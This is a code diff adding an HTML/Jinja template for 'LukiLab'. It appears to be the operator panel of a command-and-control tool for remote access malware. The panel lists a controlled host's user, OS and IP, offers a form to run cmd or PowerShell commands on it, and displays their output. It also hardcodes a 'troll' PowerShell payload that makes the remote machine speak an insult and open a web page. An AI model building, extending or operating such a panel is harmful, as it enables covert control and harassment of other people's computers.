@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>LukiLab - {{ agent.hostname }}</title>
+<style>
+:root { --red: #e74c3c; --red-b: #ff4444; --red-d: #8b0000; --bg: #0d0d0d; --surface: #1a1a1a; --border: #2a2a2a; --text: #e0e0e0; --dim: #888; }
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: 'Segoe UI', system-ui, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  font-size: 15px;
+}
+pre, code, .mono { font-family: 'Consolas', 'Courier New', monospace; }
+.header {
+  border-bottom: 1px solid var(--border);
+  padding: 16px 32px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  background: var(--surface);
+}
+.header .logo { font-weight: 700; font-size: 16px; }
+.header .logo em { font-style: normal; color: var(--red); }
+.header .logo a { color: var(--dim); text-decoration: none; font-weight: 400; transition: color .2s; }
+.header .logo a:hover { color: var(--red); }
+.header a { color: var(--dim); text-decoration: none; font-size: 13px; transition: color .2s; }
+.header a:hover { color: var(--red); }
+.container { padding: 32px; max-width: 1600px; margin: 0 auto; }
+
+/* info panel */
+.info {
+  border: 1px solid var(--border);
+  padding: 20px 24px;
+  margin-bottom: 20px;
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+  gap: 12px 32px;
+}
+.info .field { }
+.info .label { font-size: 11px; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; font-weight: 600; margin-bottom: 4px; }
+.info .value { font-size: 16px; font-weight: 600; word-break: break-all; }
+
+/* exec */
+.exec {
+  border: 1px solid var(--border);
+  padding: 20px 24px;
+  margin-bottom: 20px;
+}
+.exec h3 { font-size: 12px; font-weight: 600; color: var(--red); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 14px; }
+.exec-form { display: flex; gap: 8px; flex-wrap: wrap; }
+.exec-form select, .exec-form input[type=text] {
+  padding: 10px 12px;
+  background: var(--bg);
+  border: 1px solid var(--border);
+  color: var(--text);
+  font-family: 'Consolas', monospace;
+  font-size: 14px;
+  outline: none;
+  transition: border .2s;
+}
+.exec-form select { width: 120px; cursor: pointer; }
+.exec-form input[type=text] { flex: 1; min-width: 200px; }
+.exec-form select:focus, .exec-form input[type=text]:focus { border-color: var(--red); }
+.btn {
+  padding: 10px 22px;
+  background: var(--red);
+  border: none;
+  color: #fff;
+  font-family: 'Segoe UI', system-ui, sans-serif;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  transition: background .2s;
+}
+.btn:hover { background: var(--red-b); }
+.btn-del {
+  background: transparent;
+  border: 1px solid #500;
+  color: var(--red-d);
+  font-size: 11px;
+  padding: 3px 10px;
+  cursor: pointer;
+  letter-spacing: 0;
+  transition: background .2s, color .2s;
+}
+.btn-del:hover { background: var(--red); color: #fff; border-color: var(--red); }
+
+.btn-dead {
+  padding: 10px 22px;
+  background: transparent;
+  border: 1px solid var(--red-d);
+  color: var(--red);
+  font-family: 'Segoe UI', system-ui, sans-serif;
+  font-size: 12px;
+  font-weight: 600;
+  cursor: pointer;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  transition: background .2s, color .2s;
+}
+.btn-dead:hover { background: var(--red); color: #fff; }
+
+.btn-troll {
+  padding: 10px 22px;
+  background: transparent;
+  border: 1px solid #ff6b35;
+  color: #ff6b35;
+  font-family: 'Segoe UI', system-ui, sans-serif;
+  font-size: 13px;
+  font-weight: 700;
+  cursor: pointer;
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  transition: background .2s, color .2s, box-shadow .2s;
+}
+.btn-troll:hover {
+  background: #ff6b35;
+  color: #fff;
+  box-shadow: 0 0 20px rgba(255,107,53,.4);
+}
+
+h3.section {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--dim);
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  margin-bottom: 14px;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--border);
+}
+h3.section em { font-style: normal; color: var(--text); }
+table { width: 100%; border-collapse: collapse; table-layout: fixed; }
+thead th {
+  text-align: left;
+  padding: 10px 14px;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--dim);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  border-bottom: 1px solid var(--border);
+}
+td {
+  padding: 10px 14px;
+  border-bottom: 1px solid #1a1a1a;
+  vertical-align: top;
+  font-size: 14px;
+}
+tr:hover td { background: #121212; }
+.tid { color: var(--dim); font-size: 12px; font-family: 'Consolas', monospace; }
+.ttype {
+  display: inline-block;
+  padding: 2px 10px;
+  border: 1px solid #333;
+  color: var(--dim);
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  font-weight: 600;
+}
+.tcmd { font-family: 'Consolas', monospace; font-size: 13px; color: var(--red); word-break: break-all; }
+.tstat {
+  font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; font-family: 'Consolas', monospace;
+}
+.tstat.pending { color: var(--dim); }
+.tstat.running { color: #3498db; }
+.tstat.done { color: #2ecc71; }
+.tstat.failed { color: var(--red-b); }
+td pre {
+  font-family: 'Consolas', monospace;
+  font-size: 12px;
+  background: #080808;
+  padding: 8px 10px;
+  max-height: 160px;
+  overflow: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+  border: 1px solid #151515;
+  color: var(--text);
+  line-height: 1.4;
+}
+tr td:last-child { width: 40px; }
+.empty-state { color: var(--dim); text-align: center; padding: 48px 0; font-size: 14px; }
+
+/* column widths */
+table thead th:nth-child(1) { width: 60px; }
+table thead th:nth-child(2) { width: 70px; }
+table thead th:nth-child(4) { width: 70px; }
+table thead th:nth-child(5) { width: 40%; }
+table thead th:nth-child(6) { width: 40%; }
+</style>
+</head>
+<body>
+<div class="header">
+<div class="logo"><a href="/lukilab/">&lt; back</a> [ <em>LukiLab</em> ] {{ agent.hostname }}</div>
+<div style="display:flex;gap:12px;align-items:center">
+<form method="POST" action="/lukilab/agent/{{ agent.id }}/delete" onsubmit="return confirm('delete agent {{ agent.id[:8] }} permanently?')">
+<button class="btn-dead" type="submit">delete agent</button>
+</form>
+<a href="/lukilab/logout">logout</a>
+</div>
+</div>
+<div class="container">
+
+<div class="info">
+<div class="field"><div class="label">hostname</div><div class="value">{{ agent.hostname }}</div></div>
+<div class="field"><div class="label">user</div><div class="value">{{ agent.username }}</div></div>
+<div class="field"><div class="label">os</div><div class="value">{{ agent.os }}</div></div>
+<div class="field"><div class="label">ip</div><div class="value">{{ agent.ip }}</div></div>
+<div class="field"><div class="label">status</div><div class="value" style="color:var(--red)">{{ agent.status }}</div></div>
+<div class="field"><div class="label">last seen</div><div class="value">{{ agent.last_seen.strftime('%Y-%m-%d %H:%M:%S') if agent.last_seen else '--' }}</div></div>
+<div class="field"><div class="label">id</div><div class="value mono" style="font-size:13px;color:var(--dim)">{{ agent.id }}</div></div>
+</div>
+
+<div class="exec">
+<h3>execute command</h3>
+<form class="exec-form" method="POST" action="/lukilab/execute">
+<input type="hidden" name="agent_id" value="{{ agent.id }}">
+<select name="type">
+<option value="cmd">cmd</option>
+<option value="raw">raw</option>
+<option value="powershell">ps</option>
+<option value="exit">exit</option>
+</select>
+<input type="text" name="command" placeholder="whoami /all" autofocus>
+<button class="btn" type="submit">run</button>
+</form>
+<form class="exec-form" method="POST" action="/lukilab/execute" style="margin-top:10px;border-top:1px solid #2a2a2a;padding-top:14px;justify-content:space-between;align-items:center">
+<input type="hidden" name="agent_id" value="{{ agent.id }}">
+<input type="hidden" name="type" value="powershell">
+<input type="hidden" name="command" value="Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('troliado puto'); Start-Process 'https://www.youtube.com/watch?v=fCDB0biHWus'">
+<span style="font-size:12px;color:var(--dim)">troll button</span>
+<button class="btn-troll" type="submit">+ troll</button>
+</form>
+</div>
+
+<h3 class="section">tasks <em>({{ tasks|length }})</em></h3>
+
+<table>
+<thead>
+<tr><th>id</th><th>type</th><th>command</th><th>status</th><th>output</th><th>error</th><th></th></tr>
+</thead>
+<tbody>
+{% for t in tasks %}
+<tr>
+<td class="tid">{{ t.id[:8] }}..</td>
+<td><span class="ttype">{{ t.type }}</span></td>
+<td class="tcmd">{{ t.command }}</td>
+<td><span class="tstat {{ t.status }}">{{ t.status }}</span></td>
+<td><pre>{{ t.stdout or '' }}</pre></td>
+<td><pre>{{ t.stderr or '' }}</pre></td>
+<td>
+<form method="POST" action="/lukilab/delete/{{ t.id }}" onsubmit="return confirm('delete task {{ t.id[:8] }}?')">
+<button class="btn-del" type="submit">x</button>
+</form>
+</td>
+</tr>
+{% else %}
+<tr><td colspan="7" class="empty-state">no tasks</td></tr>
+{% endfor %}
+</tbody>
+</table>
+
+</div>
+</body>
+</html>
